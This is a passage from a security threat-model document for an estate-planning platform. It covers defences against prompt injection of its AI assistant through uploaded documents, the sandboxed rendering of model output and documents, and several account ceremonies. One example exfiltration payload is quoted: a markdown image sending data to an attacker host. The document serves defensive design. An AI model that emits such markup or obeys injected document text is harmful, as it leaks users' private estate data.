language**, through document text the owner uploaded and asked it to read. Risk
#6 ("LLM prompt injection via uploaded docs", H/M) stops being a forecast here.

**Treatment, in the order it actually holds.** The register's stated treatment
was "untrusted-input framing, read-only tools, output filtering". Building it
made the ordering clear, and the ordering is the finding:

1. **No tool schema can name a subject.** A tool receives its authority — the
   verified session subject plus that caller's bearer — and declares only what
   to fetch, never whose data. Injected text can persuade the model to CALL a
   tool; it has no field in which to say whose estate it wants. Enforced at
   registry construction, so a violation is a process that will not start.
2. **No sink.** Every tool is read-only; there is no send, write, outbound-fetch
   or web-search tool. The worst a successful injection achieves is a
   misleading answer to the owner about the owner's own data, which is exactly
   why the impact rating is Medium and what keeps it there. Adding any
   outward-facing tool would change that rating and requires revisiting this
   section.
3. **Framing retrieved text as data is ADVISORY** and is documented as the
   weakest layer in its own source file. It neutralizes delimiter injection so
   content cannot terminate its own block, but a sufficiently clever payload can
   argue with layer 3. Layers 1 and 2 cannot be argued with.

"Output filtering" is deliberately NOT claimed as a control.

**MODEL-OUTPUT EXFILTRATION — CLOSED IN M11, and worth reading as a history of
how nearly it was not.** An M10 draft of this paragraph credited PR4 with
"restricted markdown, no autolinking, no remote images". PR4 shipped no
conversation UI and no renderer at all, so the paragraph dispositioned a live
risk against a control nobody had built — the M4 legal-hold zero-callers shape,
in prose. The M10 security review caught it and reopened the requirement, owed
by whoever shipped the chat surface, in the same PR as the first pixel of
model-authored text.

M11 is that PR, and the constraint is now real. `MessageText`
(`apps/web/src/components/MessageText.tsx`) is the ONLY renderer any message
gets, in either role, and it builds text nodes: no parser, no allowlist, no
`dangerouslySetInnerHTML` (a source scan over the whole app enforces that, with
`app/layout.tsx`'s theme script as the one declared exemption). A model-emitted
`![](https://attacker/?data=…)` renders as those characters — verified in a real
browser against a payload carrying a markdown image, a markdown link and a raw
`<img>` tag: zero image elements, zero anchors to the payload's host, zero
network requests to it.

Behind it, and independent of it, the app now sends a Content-Security-Policy
with `img-src 'self' data:` and `connect-src 'self'`, so the browser refuses a
remote image load even if a future renderer regresses. **That CSP is
deliberately not complete**: `script-src` still allows inline, because Next's
hydration bootstrap and the theme script are inline and locking them down needs
per-request nonces through middleware. Saying so plainly is the point — a
stricter directive that gets relaxed under deploy pressure would be worse than
an honest partial one.

It remains a rendering constraint rather than a filter on model output; calling
it filtering would overclaim. The cost is stated where it lands: answers render
as plain prose with no lists or emphasis, and whoever adds formatting inherits
this requirement, because adding a parser here is adding a sink.

**TB5 — the LLM provider boundary.** The assistant is the isolating service:
the provider SDK and its credential will exist only there (PR2). It holds NO
internal service credential in either direction, so a compromised assistant
replays the sessions it is currently serving and cannot mint new authority —
the property is machine-checked by the credential graph rather than asserted.
Conversation transcripts are Zone B under a dedicated `ai-assistant/kek`, and
they are persisted precisely so the client cannot supply history: a
client-supplied transcript could forge prior assistant turns and prior tool
results, and a forged tool result is indistinguishable from a real one.

**A constraint our own requirements impose on model choice.** docs/03 §4 TB5
requires providers under zero-data-retention agreements. Claude Fable 5
requires 30-day retention and is not available under ZDR, so the most capable
model is disqualified by our own threat model; PR2 targets a ZDR-eligible model.

**Consent.** Deny by default structurally — there is no `granted` boolean, so
a user who never answered and one who revoked are the same answer. Granting is
step-up gated because it widens third-party egress (export-class under docs/01
§5); revoking is not, on the M6 rule that the protective action must never be
harder than the permissive one.

**Recorded, not fixed.**
- *Uploaded-document text remains unreadable by anything.* M4's OCR artifact has
  no decrypt counterpart and M10 does not add one, so the assistant cannot
  discuss anything a user uploaded. That is a capability gap, not a control —
  closing it means building a bulk-readable text path, which is what §5.3
  exists to prevent, and it needs its own PR, consent scope and delta.
- *Conversations are outside staged settlement access (§6a).* An executor gets
  inventory, then documents, then vault; conversations are in none of those
  rungs and `assistant.cedar` grants no role-holder verb. A transcript ranges
  over the whole estate and may contain content the owner never intended anyone
  to read, so admitting it would need its own milestone and its own decision.
- *The egress assertion is narrow on purpose.* It refuses separated SSNs and
  Luhn-valid card numbers and deliberately passes names, emails and phone
  numbers, which are the PR2 tokenizer's job. A gate that fires on ordinary
  estate traffic is one people route around.

## 6e. Threat-model delta — M12 documents surface PR1 (2026-08-06)

M4 built the document service; nothing rendered a document until now. The new
surface is a place where **stored document content reaches a screen**, which
puts risk #6 (LLM prompt injection via uploaded docs, H/M) next to a second,
older question this repo had not yet had to answer: what happens when the
browser is handed a document's own markup.

**The renderer, and why it differs from `MessageText`.** §6d's answer for model
output was an ABSENCE — text nodes, no parser, no sink. A document cannot be
rendered that way and still be a document, so `DocumentViewer`
(`apps/web/src/components/DocumentViewer.tsx`) substitutes CONTAINMENT: the
bytes go into a `srcdoc` iframe with `sandbox=""` — the empty value, which
grants nothing: no scripts, no same-origin, no forms, no popups, no top-level
navigation. The component reads nothing and parses nothing, and it adds no
`dangerouslySetInnerHTML`: the M11 source scan covers the new files unchanged
and still allows exactly one use, `app/layout.tsx`'s theme script, which M11
declared as data. (An earlier draft of this paragraph said "anywhere in the
app" and dropped that declared exemption — corrected in the M12 review, since
a doc that overstates a control is the defect class this repo keeps finding.)

Three layers hold it, and only the first two are relied on:

1. **The sandbox.** No script executes, and the frame is in an opaque origin
   with no access to the app's DOM, storage or cookies. `allow-scripts` and
   `allow-same-origin` TOGETHER would undo the whole thing, so the exact value
   is asserted in the component's spec rather than matched as a substring.
2. **The page CSP.** A `srcdoc` frame inherits the embedding document's policy,
   so `img-src 'self' data:` and `connect-src 'self'` apply INSIDE the frame:
   a remote image smuggled into document text is refused by the browser, not by
   anything we wrote. This is the same CSP §6d describes, doing a second job.
3. **The `csp` attribute** (`default-src 'none'`), Chromium-only and stated
   here as defence in depth rather than as the control.

**Verified against a hostile document in a real browser**, not only in jsdom: a
payload carrying a remote `<img>`, an inline `<script>` writing to the parent, an
`onerror` handler, an off-origin `<form>`, a `target="_top"` link and a nested
remote iframe was substituted into the content response and rendered through the
real component. Result: zero network requests to the payload's host, the script
probe never fired, no element from the payload entered the parent DOM, and
`contentDocument` was unreachable from the page.

**A SECOND FENCE ships with it**, because the realistic regression is not an
edit to the viewer: a source scan asserts that `DocumentViewer.tsx` is the ONLY
file in the app that renders an `<iframe>`. A frame added elsewhere for a
preview or an embed would reopen the channel from a file nobody thought of as a
renderer — the credential-graph habit of stating the exception as data.

**What is NOT framed.** Only `text/html` with `encoding: utf8` reaches an
iframe, which is generated content — platform-rendered from a sha256-pinned
template with every substituted value HTML-escaped by the service. An upload can
never be `text/html` (the ingest sniff admits pdf/png/jpeg/tiff only), and the
component checks rather than trusting that invariant from a distance. Presenting
uploaded binaries is PR2's problem and gets its own decision.

**Audited-decrypt volume is a design constraint on this surface, not a
side effect.** Every content read emits `crypto.field.decrypted` +
`document.content.viewed` and consumes a KMS operation, so a list that
previewed content would convert one page load into N events on the user's own
trail and blunt exactly the per-principal decrypt-rate baseline §4 TB4 calls the
single most important insider control. Hence: metadata-only lists, no content
field on the document type, no prefetch, and no cache that would make a repeat
read invisible. Proven live against the stack — two Read presses produced
exactly two decrypt pairs, and loading the list and detail pages produced none.

**Recorded, not fixed.**
- *The 404-vs-403 oracle is narrowed at the edge, not closed.* The BFF answers
  the uniform not-found for a plain downstream 403, so browser traffic cannot
  tell "no such document" from "someone else's". The service still
  distinguishes them for any other caller — the M4 review's open follow-up,
  unchanged, and the real fix belongs there.
- *`documents.title` remains plaintext* (the M4 decision, on the
  `assets_view.title` precedent). The generate form now says so where the field
  is, rather than leaving users to infer that the title is protected like the
  contents.
- *`script-src` is still not locked down*, exactly as §6d states. The sandbox
  does not depend on it: `sandbox=""` blocks script execution inside the frame
  whatever the page policy permits outside it.

**PR2 addendum — ingest, the ladder, and deletion (2026-08-06).**

*The upload gate is the SERVER's, and the client is built not to have an
opinion.* Magic-byte sniffing against the declared mime is the control against
polyglot mislabeling, and the malware scan is fail-closed and pre-storage, so
every refusal means the bytes reached no disk. A client-side type check would
be a second opinion that can disagree with the one that matters — so there is
none: `accept` is a picker hint, `file.type` is forwarded as a declaration, and
the only local check is the size cap, mirroring the server's own number. The
three refusals are kept apart to the last layer (`MALWARE_DETECTED`,
`UNSUPPORTED_CONTENT`, `SCAN_UNAVAILABLE`) because softening a positive scanner
finding into "unsupported file type" would withhold the one thing a user needs
to know about a file somebody sent them. Verified live against real clamd
through the browser: the signature-carrying PNG was refused and nothing stored.

*The execution ladder is computed where the requirements are verified.* Risk #8
is a legal/compliance failure in a state template, treated by "attorney-gated
template releases; per-state execution-requirement engine". A UI that hardcoded
the ladder would be a second copy of that engine, drifting toward the weakest
rung — which is precisely the fail-open the M4 review closed inside the
service. So the service returns `allowedTransitions` from its own
sha256-verified template source, the UI renders exactly that, and the write
path re-resolves the requirements inside its own transaction regardless. An
unverifiable template yields an EMPTY ladder, not a guessed one.

*Presenting an uploaded binary — the decision PR1 deferred.* Images render
INLINE from a `data:` URI: the page CSP already allows `img-src 'self' data:`,
the bytes reach the browser's image decoder (the same exposure any image on any
page carries), and a `data:` URI cannot reach the network. The mime is the
SERVICE's sniffed value, not the uploader's claim, and it is checked against a
closed set before it is interpolated, so no attacker-chosen string becomes the
type of a URI this page constructs. PDFs and TIFFs DOWNLOAD instead: a framed
PDF is the browser's PDF engine — a large parser — invoked on attacker-supplied
bytes inside our own frame tree, whereas a download hands the file to whatever
the user already trusts. The filename is generated from ids, never from
`documents.title`, because a filename is where user text ends up in a shell, a
sync client, or a mail header. Leaving this deferred a second time had a cost
the M12 review named: `Read` was offered for versions the viewer then refused,
so an audited decrypt was spent to display nothing.

*The search term left the URL.* `GET /v1/documents/search?q=` was M4's shape,
and M12 was its first caller. The term is by construction a word out of the
user's own estate — a beneficiary's name, a property address — and a query
string is the one part of a request intermediaries record by default; the
topology docs/01 §2 describes puts CloudFront and WAF access logs in that path.
It is a POST with the term in the body now. Nothing else changed: the term is
still reduced to per-user HMAC tokens and matched ciphertext-side, and no
decrypt happens to serve a search.

*Deletion.* Step-up gated per docs/01 §5, and the legal hold wins over the
owner. Running the real app exposed an ordering seam worth recording: the
step-up guard sits at the controller and the hold check inside the handler, so
a stale session is told `stepup_required` first and the hold only after. That
ordering is fine as defence in depth, but the UI must not send someone to find
an authenticator for an action that will be refused either way — a held
document is now not offered for deletion at all. RECORDED, NOT CHANGED: the
service's ordering, since moving the hold check ahead of the guard would put an
unauthenticated-for-this-action read of estate state before the gate.

## 6f. Threat-model delta — M13 people surface PR1 (2026-08-06)

M13 gives the M2 profile & contacts service its first consumer. PR1 hardens what
was already deployed, before anything is built on top; the surface itself (PR2)
and the contact-link ceremony (PR3) extend this section.

**TB8 (role-holders → owner's estate data) had no step-up gate on its own
control objects.** §5.5's boundary is enforced by `role_assignments` and
`permission_grants` — they are the data that decides what a beneficiary can
read. Creating one is a docs/01 §5 step-up action in terms ("trustee/executor
changes, beneficiary changes"), and M2 shipped all three mutation routes under
`CallerGuard` alone because it predates `@estate/auth-guard`; the sibling
beneficiary route in the asset service complied. So a bearer token stolen from a
live session was sufficient to name a trustee over an entire estate. Closed:
grant, revoke and permission-attach all require a step-up fresh within 5
minutes, uniformly across all twelve roles.

*Why revoke is gated and permission-withdrawal is not.* The M6 rule is that the
protective action must never be HARDER than the permissive one — equal is
allowed. Revoking an assignment is not purely protective in this domain: it
destroys the executor-resolution path M7 depends on and can strip the last
linked contact able to report a death or rescue a §5.1 case, so an attacker who
revokes is isolating the owner, not protecting them. Withdrawing one permission
grant genuinely only narrows, so it is `CallerGuard`-only — an owner who can see
a grant they regret must be able to pull it without first finding their
authenticator.

**A §5.1 control was revocable by accident, twice.** `contacts.linked_user_id`
is the anti-enumeration gate this document credits (§6b: intake "cannot
enumerate" *because* reporters must already be named by the decedent's contact
repository). Two ordinary, unaudited operations silently removed it:

- Editing any field of a contact cleared the column, because one encrypt helper
  hardcoded it null and fed both the insert and the update. Closed by type: the
  shape both statements are built from has no such key.
- Soft-deleting a contact left its `role_assignments` live while every
  role-holder query joins `contacts ... AND deleted_at IS NULL`, so an executor
  stopped resolving and every grant stopped being effective with the assignment
  still listed and no `role.revoked` emitted. Closed with `409 contact_in_use`:
  retiring a fiduciary is a separate, step-up-gated, audited act.

Both are the same class as the M7/M9 findings — a control that stops working
without saying so, indistinguishable from one that is working.

**A Zone B write path destroyed the most sensitive column in the product.**
`PUT /v1/profile` was a full replace while `GET /v1/profile` returns `ssnLast4`
and never `ssn`, so any edit through any client wrote NULL over `ssn_ct` and
`ssn_last4_ct`. Now absent means unchanged. The preservation deliberately copies
CIPHERTEXT: decrypt-and-re-encrypt would put the full SSN through the service on
every unrelated edit and emit a `crypto.field.decrypted` on `profile.ssn` each
time — pure added exposure on the §5.3 bulk-decrypt path in exchange for
nothing. A row whose `dek_id` is no longer the owner's active DEK (crypto-shred)
is refused rather than re-stamped, so an erased record cannot be made to look
intact.

**RECORDED, OWED BY PR2 (§4 TB4).** Contact and family-member reads decrypt
every field, one audited `crypto.field.decrypted` each, so a list view is a
bulk-decrypt surface: twenty contacts is roughly a hundred events on the owner's
own trail per page load, and it blunts the per-principal decrypt-rate baseline
this document calls the single most important insider control. The DEK cache
means it is not a hundred KMS operations, which is the weaker half of the
control. PR1 does not change it; PR2 owes a narrowed list projection under M12's
audited-decrypt-volume rule, and this paragraph is the requirement, not an
observation.

*DISCHARGED FOR CONTACTS, DELIBERATELY NOT FOR FAMILY (PR2).* The contact list
now spends one audited decrypt per row and the values have no field on the wire
at all. The FAMILY list still decrypts every field it stores, and that is a
scope-down with a reason rather than an oversight: the household panel RENDERS
name, date of birth, minority and notes, so there is nothing to narrow — four of
five contact fields were unused by a list, and zero of four family fields are.
The volume differs by an order of magnitude too (a household is a handful of
rows; an address book is not). If a future surface lists family members without
showing them, it inherits this requirement.

## 6g. Threat-model delta — M13 the contact link ceremony (2026-08-06)

`contacts.linked_user_id` had no write path anywhere in the platform until this
change. That is why §6b could credit the linked-contact gate for intake being
unable to enumerate while nobody could actually become a linked contact: the
control was real and the capability behind it was unreachable. M13 PR3 makes it
reachable, which activates every consequence §6b described.

**What a link confers, stated in one place.** Being the linked user of a
contact means: eligibility to open a settlement case against that owner (§5.1
control 1's reporter test), resolvability as their executor when a case is
verified (§5.1 control 5), and effectiveness of any `permission_grant` attached
to a role assignment naming that contact (§5.5). None of those is granted by the
link alone — each needs its own separate step — but none of them is reachable
without it.

**The ceremony.** Owner mints a 160-bit single-use code under step-up; the
server stores only its sha256; the owner is shown it ONCE and delivers it out of
band; the contact redeems it while authenticated on their own existing account.
Three properties are load-bearing:

- *No address is handled anywhere.* M9's shipped doctrine gives the notification
  wire no content field and forbids links, so an emailed invitation would have
  contradicted a decision made one milestone earlier. It also means this flow
  adds no second home for a contact's email address.
- *The code is the ONLY selector on redemption.* The route takes no owner id and
  no contact id — there is no parameter in which to name an account, so
  redemption cannot become an oracle for whether one exists. This is the same
  property §6b credits intake with, preserved rather than re-argued.
- *The redeemer must already have an account.* Not an invite-to-register flow,
  and it cannot be used to create one.

**Uniform refusal.** Unknown, expired, spent, revoked, self-directed and
raced-away codes all answer `invalid_code`, byte-identical. Distinguishing them
would tell whoever holds a guess that the guess named something real. Accepted
cost: a legitimate user gets a vaguer message, paid down by letting the owner
re-issue freely (which retires the previous code and audits the retirement).

**Gate asymmetry, in both directions.** Minting is step-up gated — it hands out a
capability on the §5.1 chain, so it sits with naming a fiduciary. Withdrawing an
unused code and removing a live link are `CallerGuard` only, on the M6 rule that
the protective action must never be harder than the permissive one. Redemption is
`CallerGuard` only because the authority is the code.

**FLAGGED DEVIATION: redemption takes no Cedar decision.** Every other route in
this service passes a PEP first. Redemption cannot: the redeemer has no
relationship to the estate until it succeeds, so every attribute a policy could
match on is precisely what the code stands in for, and a decision there would
read `deny` until the moment it read `allow` for reasons the policy could not
see. The authority is a bearer capability. Recorded here rather than disguised.

**Notifications are a PRECONDITION in production, and the send's OUTCOME is
recorded.** Redemption refuses (503 `notifications_unavailable`, separately
audited) behind an adapter that reaches nobody — the M6/M7/M9 rule. Behind a real
adapter the send is best-effort by design (a notification failure must never roll
back the state change it describes), but never silent: the claim's audit event
carries `ownerNotified: delivered|failed`, the vault delivered_at-NULL precedent,
so a non-delivery is a recorded fact rather than an absence. The notify also runs
BEFORE the audit emit, because the emit propagates broker failures by design and
must not be able to cancel the notification — the code is spent by then and no
retry would ever re-send it. The reason is specific: a claim the owner never
hears about is how a code that went to the wrong person becomes an invisible
authorization edge, and the owner's out-of-band channel is this ceremony's trust
anchor, so their after-the-fact visibility is what makes the anchor auditable.
Profile therefore becomes the third holder of the notifications SEND credential —
and deliberately not of the RECIPIENTS credential, so it can never repoint where
anyone's alerts go (the M9 review's split, applied to a new holder).

**Atomicity is a control, not hygiene.** Spending the invitation and writing the
link happen in one transaction with each statement restating its own
preconditions. A spend with no link would lock that contact out of ever being
linked; a link from an invitation still live would be replayable. Two concurrent
redemptions of one code therefore produce exactly one link and the loser rolls
back — the CAS shape §6b's owner-liveness interlock uses, for the same reason.

**ACCEPTED RESIDUALS, stated rather than implied.**

- *The owner's channel is the trust anchor.* An owner who sends the code to the
  wrong person links the wrong person. Detected rather than prevented: audited on
  both sides with the redeemer as actor, notified to the owner, visible in their
  contact list, and removable in one click. Identical in kind to M6's
  grantee-fingerprint confirmation.
- *The attempt cap bounds an online attack on a REAL code only.* An unknown code
  leaves no row to count against, by construction. 160 bits is what makes
  guessing infeasible; the counter is what an alert would watch. General
  per-caller rate limiting on the redeem route is edge work (§4 TB1) and is
  UNCHANGED by M17 PR1, whose two bounds key on an account and on a submitted
  address — a redeem request carries neither, which is the same "nothing to
  attribute a count to" that makes the row-keyed cap weak here (§6k).
- *A code lives in the owner's session response and wherever they put it next.*
  It is not stored recoverably server-side, but it is a secret in a browser for
  as long as that page is open, and in whatever channel the owner chooses. That
  is inherent to an out-of-band ceremony.
- *Unlinking does not revoke what the link already enabled.* A settlement case
  the linked contact opened before being unlinked stays open — cases are evidence
  and have no soft delete (§5.1 c6) — and is stopped by the owner's own
  step-up-gated void route, not by unlinking.

## 6h. Threat-model delta — M14 address ownership (2026-08-07)

**What was wrong.** Three shipped fail-closed controls — §5.2 emergency access,
§5.1 settlement intake and review-approve, and §6g's link ceremony — refuse in
production rather than proceed silently, on the rule that a waiting period
nobody can be told about is not a control. All three tested
`deliversToRealChannels`, which is A PROPERTY OF THE ADAPTER, NOT OF THE
RECIPIENT: a hardcoded literal on whichever adapter class that service's own
`NOTIFY_MODE` selected, declared independently three times, `false` on the stub
and `true` on the HTTP one. It asks whether SES is wired. It never asks whether
the stored address belongs to the owner, and could not — the bit never left the
process and never named a recipient. So the gate was satisfied, the escrow
armed or the five-day clock started, and the owner's ability to INTERRUPT — the
entire content of §5.2 and of §5.1's control 3 — was unenforced.

The sharp part was an anti-correlation: the only self-heal was identity's
login-time re-feed, so the stored address was freshest for active users and
STALEST for the dormant owner a fraudulent death report actually targets — and
once status reaches `settlement`, login is blocked, so it could never heal.

**The ceremony.** Identity mints a 160-bit code at FIRST AUTHENTICATED LOGIN
(never at registration — an unauthenticated route would be a mail-bomb and
sender-reputation primitive; **M17 PR1 falsified the second half of this
parenthesis, and the decision stands on the first half alone** — register now
carries an address-keyed bound (§6k), but it is per-process and best-effort,
which is not something to hang a mail-bomb defence on, and firing a notification
kind at an unauthenticated route would still be reachable by anyone holding a
victim's address), stores only
its sha256, mails it through notifications' own credential-scoped route, and
marks the address verified when the user returns it. One uniform `invalid_code`
for unknown, expired, spent, revoked, attempt-exhausted, someone-else's and
raced; free re-issue behind a five-minute floor.

**The verified bit lives on `notification_recipients`**, not on `users`, so the
delivery store structurally cannot hold an unproven address without saying so.
`users.email_verified_at` stays dead rather than becoming a second source of
truth.

**Gate classification.** A verified address gates CAPABILITY-ARMING actions, not
case-opening ones:

| requires verified (refuses) | proceeds and records |
|---|---|
| vault escrow `configure` | vault `request`, vault `release` |
| vault `rearm` | profile link redemption |
| profile link-code `invite` | settlement `report`, provider signal, review-approve |

The discriminator is that in the right-hand column the ACTOR and the
NOTIFICATION RECIPIENT are different people. Refusing there on the OWNER's
unverified address would let an owner's own typo permanently deny a legitimate
grantee, redeemer or reporter — the M6 rule that the protective action must
never be harder, pointed the other way — and applied to §5.1 intake it becomes a
denial of service against exactly the dormant, never-verified owner a fraudulent
report targets. Those paths record `sent_unverified` in the send log and an
`unverified_recipient` audit event instead.

**One approved deviation from M9's content doctrine.** The platform now mails a
variable that is not a date. It is a typed `code`, never a `text` field:
platform-authored (`randomBytes`), opaque, single-use, short-lived. The subject
is unchanged and there is still NO LINK, so "we never link you" stays literally
true. It travels on its own route behind its own credential, and `SendSchema` is
built from a kind list that EXCLUDES it, so a send-credential holder — vault,
settlement, profile — cannot fire it.

### Residuals

- *A user who mistypes their address at registration cannot fix it.* There is no
  address-change route anywhere in the platform, and verification can only ever
  target the address already on file. In production such a user is permanently
  refused escrow `configure`, `rearm` and link-code `invite`, with no
  self-service and no operator remedy (that belongs to the TB7 operator
  platform). The arming gates' justification — "refusing costs them an action
  they can unblock themselves" — is true for the intended contrast (actor ==
  recipient) and FALSE as an unconditional claim; it is recorded here rather than
  softened. It fails in the safe direction. **CLOSED by M17 PR4 (§6n)**: the
  change ceremony proves the NEW address before anything on file moves, so a
  mistyped registration address is now recoverable by changing to a correct
  one — and the written obligation this paragraph carried (clear the verified
  bit, invalidate outstanding codes) was discharged one step stronger than it
  asked: no unproven address ever reaches the delivery store, so the bit is
  stamped by replacement rather than cleared, and outstanding codes die in the
  same transaction as the switch.
- *A SEND-credential holder can read any user's verified bit* by firing one
  notification at them, because the send response carries `recipientVerified` —
  deliberately, so settlement can record the fact without holding the STATUS
  credential. What the STATUS edge still withholds is the SILENT read: a send
  costs the subject a real estate alarm, a committed send-log row and an audit
  event. A weaker oracle, not none. The M14 security review found the credential
  graph claiming the send edge exposed no delivery state at all; that sentence
  is corrected rather than the field removed.
- *An unreachable status route refuses every arming action.* The gates fail
  closed on an unanswerable query, so a notifications outage suspends escrow
  configuration, re-arming and link-code minting entirely. That is the intended
  direction — blocking delays a legitimate owner by minutes where the other
  direction hands an attacker a whole waiting period — but it is a total outage
  of those paths, not a degradation, and it is the first network round trip
  those gates have ever made.
- *An authenticated attacker can sustain one mail per five minutes to an
  address they typed into their own registration.* The re-issue floor is
  per-account, with no per-address, per-IP or global cap, so a single arbitrary
  address can be sent roughly 288 content-free "confirm this address" messages a
  day. UNCHANGED by M17 PR1: that change bounds login and register, and this is
  an AUTHENTICATED route whose only limit remains its own five-minute re-issue
  floor. "Rate limiting is absent platform-wide" was true when written and is
  now narrower — the platform has three bounds (step-up, login, register) and
  this route is behind none of them.
- *Registration's fixed-shape, fixed-time response is still owed.* M14 closed
  the address-ownership half of §5.3's enumeration residual and did NOT close
  the timing half: `register` still awaits KMS, inserts and Kafka publishes on
  the new-email path only. Recorded in `auth.service.ts` and unchanged here.
## 6i. Threat-model delta — M15 the vault surface (2026-08-08)

M6 activated **TB6 (client device)** in the library. M15 activates it in the
BROWSER, which is where risk #4 (vault client-side compromise, Critical) has
always actually lived: until now no page in this product ever held a Zone A key,
so every TB6 control in §4 was a requirement with no surface to apply to. §6a
recorded that plainly — "the isolated vault origin, CSP, and Trusted Types are
frontend controls; no vault UI ships in M6, so they land with that surface."
This is that surface. PR1 deliberately ships the boundary with NO vault crypto
behind it yet.

**The §4 TB6 controls, now shipped and their status.**
- *Isolated vault origin:* shipped. A different HOST (`vault.localhost:3010`
  locally, `vault.<domain>` in production), not a different port — MEASURED,
  because cookie scope ignores the port and a port-only split would have sent
  the app's session to the vault on every request. The vault's cookie carries
  the `__Host-` prefix, so host-only is enforced by the browser rather than by
  convention, which is what makes a same-registrable-domain deployment safe.
- *Strict CSP:* shipped, and stricter than the main app's honest-partial one.
  `default-src 'none'`, `script-src 'self'` with NO `unsafe-inline` and NO
  `unsafe-eval` in ANY environment, `connect-src 'self'`, `img-src 'self'` (no
  `data:`), `frame-ancestors 'none'`, `base-uri 'none'`.
- *Trusted Types:* shipped and ENFORCED — `require-trusted-types-for 'script'`
  with `trusted-types 'none'`, so no policy may be created and every DOM XSS
  sink throws. This is only possible because the client is framework-free; a
  framework that templates through `innerHTML` needs a permissive policy, which
  is the control in name only. Verified in a real browser: policy creation
  refused, `innerHTML` threw with zero nodes created, `eval`/`new Function` threw
  EvalError from page context.
- *No third-party scripts on vault surfaces:* shipped, and stronger than an
  allowlist — there is no bundler and no dependency tree. The browser client
  imports only relative paths and (from PR2) `@estate/vault-crypto` by absolute
  path from this origin. Enforced by a source fence.
- *Re-auth on vault open:* shipped. Minting the handoff requires a fresh step-up,
  and the vault service's own SRP legs are step-up gated (M6).
- *WebCrypto non-extractable keys, memory zeroization, clipboard auto-clear:*
  SHIPPED IN PR2. The master key is unwrapped as a non-extractable `CryptoKey`,
  so an injected script on this origin could use it but not read it out. Byte
  arrays are wiped where they exist; the `CryptoKey` itself has no bytes this
  client can zero, and that limit is stated in the code rather than left to be
  read as a stronger promise. Clipboard auto-clear is 20 seconds and is
  described to the user as best effort, because a page cannot read the clipboard
  to check, cannot reach a clipboard manager or a synced clipboard, and never
  clears at all if the tab is closed first.
- *Re-auth on vault open, in full:* the handoff needs a fresh step-up, and the
  vault's own SRP legs are step-up gated. PR2 adds a client-side idle lock at 5
  minutes and a `pagehide` lock, so a bfcache restore returns locked rather than
  with keys in memory.

**New in the threat model: the handoff itself.** Authority now crosses an origin
boundary, which is a channel that did not previously exist. It is a single-use
160-bit code, minted under step-up, delivered by a top-level form POST (never a
URL, a fragment, or a `Referer`), burned on the ATTEMPT, and redeemed
server-side for a session that is `vault`-audience, 15 minutes, and carries NO
refresh token. Deny-by-default audience enforcement means that session opens the
vault service and nothing else — measured across every service. A vault session
cannot mint another handoff, so a leak cannot chain forward.

**Residuals accepted, and why.**
- *The handoff is a bearer capability for 60 seconds.* Anyone holding it can
  redeem it, because the redeem route takes no other selector — which is
  deliberate, since a route that could name an account would be an enumeration
  oracle (§6g's rule). Bounded by the window, single use, TLS in production, and
  by the fact that redemption yields a session that decrypts nothing.
- *The vault origin sees contact NAMES* (from PR3's grantee picker, projected at
  the edge to `{contactId, linkedUserId, name}` and filtered to linked contacts).
  Unavoidable rather than accepted lightly: an owner confirming a key
  fingerprint out of band must know whose key it is. No other Zone B field can
  cross.
- *A subdomain shares a registrable domain with the app.* `__Host-` makes the
  cookie host-only at the browser, so the practical exposure is a cookie set
  with an explicit `Domain=` on the parent — which nothing in this repo does. A
  separate registrable domain closes it entirely and is a deployment choice.
- *`script-src 'self'` trusts this origin's own served files.* A CSP is a
  browser-side control and cannot defend against a compromised BUILD; the
  supply-chain half is the empty dependency tree and the absence of a bundler,
  not this header.
- *No rate limiting on handoff minting.* The cross-reference is corrected rather
  than the residual closed: identity's login bound shipped in M17 PR1 (§6k) and
  does not reach this route, which is authenticated and step-up gated — so the
  M16 attempt cap already stands in front of it, and what remains unbounded is a
  caller who holds a genuine step-up. Interim bound: one unspent handoff per
  user, enforced by a partial unique index, so pressing the button repeatedly
  leaves one live credential rather than many.

**The Secret Key on the device, as a residual rather than a control.** PR2
persists it in IndexedDB by default, with an explicit opt-out. Under XSS on this
origin it is readable — localStorage and IndexedDB alike, since no browser
primitive hides bytes from same-origin script — so the mitigation is the empty
dependency tree, `script-src 'self'` and enforced Trusted Types, not the storage
API. The default is deliberate: requiring 26 retyped characters at every unlock
reliably moves the key to a text file on the desktop, which is worse. The vault
PASSWORD is never persisted, so a stolen Secret Key alone opens nothing.

**PR3 — emergency access reaches a user, and §5.2's ceremony becomes real.**

*The out-of-band fingerprint confirmation is now a shipped control rather than a
design.* Until PR3 the 16-symbol fingerprint the M6 review widened had no client
at all, so key substitution by a malicious server — which `grantee_public_key_
sha256` cannot detect, because that digest is derived from whatever key the
client was handed — was mitigated only on paper. The screen shows the
fingerprint, tells the owner to check it by phone or in person and NOT through
this platform, and refuses to arm until at least one candidate is confirmed.

*A design that could not complete.* M6's `wrapped_private_key` was written and
never served, so a grantee could not open a share sealed to them and no release
could ever finish. Closed by an own-key route gated on an OPEN VAULT, which also
states the property that makes emergency access safe to expose: a stolen bearer
reaches the release route and comes away with ciphertext it cannot open, because
the private half lives inside the grantee's own vault.

*A NEW disclosure, bounded and declared.* Contact names now cross onto the vault
origin. The read is a dedicated profile route whose entire response is a contact
id, an account id and a name, it is the ONLY route in that service a
`vault`-audience session may reach, and both facts are declared as data in
`AUDIENCE_ROUTE_ADMITTERS` and checked against source in both directions. What a
leaked vault handoff buys at profile is therefore exactly that projection for the
owner's own linked contacts — measured against the live service, not argued: the
same token is refused 401 at `/v1/contacts`, `/v1/contacts/:id`, `/v1/profile`,
`/v1/profile/family` and `/v1/role-assignments`. The alternative considered and
REJECTED was a service-wide widening, which would have handed that token the
owner's PII, every contact's decrypted detail, the family tree and the roles.

*Residual, unchanged from M6 and restated because a UI does not fix it:* a server
that releases its platform half early defeats the waiting period. The
compensating controls are the audit trail and owner notification, both of which
this surface now exercises — a request, a refusal and a denial each produce an
ids-and-enums audit event, and the owner's screen offers denial as one ungated
tap.

*Residual, new:* the grantee picker's names come from the candidate list, so a
contact deleted after an arrangement was made shows as an account id. The row
still renders and can still be removed — hiding a live arrangement would be the
worse failure — but the owner sees an opaque id rather than a person.

**PR4 — the security review, and the boundary it found crossed.**

*The isolation held for confidentiality and not for destruction.* Reaching the
vault API was never opening a vault — that needs the vault password and the
Secret Key, neither of which this platform holds. But `POST /v1/vault/reset` is
gated on step-up ALONE, deliberately, because a lost vault password cannot be
proven; and handoff redemption granted step-up. So a stolen 60-second code
crypto-shredded every item, the emergency escrow and the recovery keypair. The
escalation is the sharp part: app-origin script cannot MINT a handoff (minting is
step-up gated) but can read one out of the hidden field it is posted in, so
stealing a code converted no-step-up into step-up authority over Zone A — and
